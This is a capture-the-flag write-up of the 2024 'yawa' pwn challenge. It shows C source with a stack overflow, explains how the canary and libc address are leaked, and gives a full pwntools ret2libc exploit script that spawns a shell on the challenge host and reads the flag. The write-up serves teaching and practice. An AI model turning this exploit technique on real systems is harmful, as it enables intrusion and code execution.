https://ctftime.org/event/2284

# yawa (pwn)

Yet another welcome application.

nc 2024.ductf.dev 30010

https://play.duc.tf/challenges#yawa-36

## Analysis

We are given the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int menu() {
    int choice;
    puts("1. Tell me your name");
    puts("2. Get a personalised greeting");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

int main() {
    init();

    char name[88];
    int choice;

    while(1) {
        choice = menu();
        if(choice == 1) {
            read(0, name, 0x88);
        } else if(choice == 2) {
            printf("Hello, %s\n", name);
        } else {
            break;
        }
    }
}
```

We can see that there is a mismatch between the size of `name` specified with `88` and the size provided to `read` of `0x88`.

We can use this out-of-bounds write to control the return address of `main`.

However, first we need two things:

1) A copy of the canary from the stack
2) A leak of an address from `libc.so.6` so that we can compute the actual addresses for things in `libc.so.6`

Luckily, as we are in `main`, the return address for this function is an address in `libc.so.6` and our `read` is large enough to reach both.

I was unable to debug the binary as it came so i used https://github.com/io12/pwninit/releases to patch it as follows:

```bash
$ ./pwninit
```

This creates `yawa_patched` a patched version of `yawa` I could use to debug locally.

## Solution

1) Overwrite the stack up to an including the first byte of the canary
    - This is important as the first byte of the canary will be "\x00" and `printf` will stop here unless we change the value
2) Use `printf` to read the seven non-zero bytes of the canary
3) Overwrite the stack up to the return address
4) Use `printf` to read the 6 non-zero bytes of the return address
5) Use knowledge of the address of this code to compute the current `libc.so.6.` ASLR base
6) Finally replace the return address, taking care to write the canary bytes correctly, and `ret2libc`
    - Ensure that an aligning ret is provided as part of the payload or the stack will not be correctly aligned and the program will crash

```python
#!/usr/bin/env python3

from pwn import *
import struct

#context.log_level = "debug"
elf = ELF("./yawa_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.ductf.dev", 30010)

p.sendlineafter(b"> ", b"1") # leak canary
p.send(b"A" * 89)
p.sendlineafter(b"> ", b"2")
p.recv(88 + 7 + 1)
canary = b"\x00" + p.recv(7)
log.success(f"canary: {canary.hex()}")

MAIN_RETURN_ADDRESS = 0x29d90 # where, in libc.so.6, main should return to

p.sendlineafter(b"> ", b"1") # leak return address
p.send(b"A" * 0x68)
p.sendlineafter(b"> ", b"2")
p.recv(0x68 + 7)
leak = struct.unpack("<Q", p.recv(6) + b"\x00\x00")[0]
libc.address = leak - MAIN_RETURN_ADDRESS
log.success(f"libc: {hex(libc.address)}")

p.sendlineafter(b"> ", b"1") # set return address to system("/bin/sh")
rop = ROP(libc)
rop.raw(b"A" * 88)
rop.raw(canary)
rop.raw(p64(0)) # saved rbp
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.send(rop.chain())

p.sendlineafter(b"> ", b"3") # return from main

p.sendline(b"cat flag.txt")

print(p.readline().decode()) # DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
```

## Flag
`DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`

smiley 2024/07/06
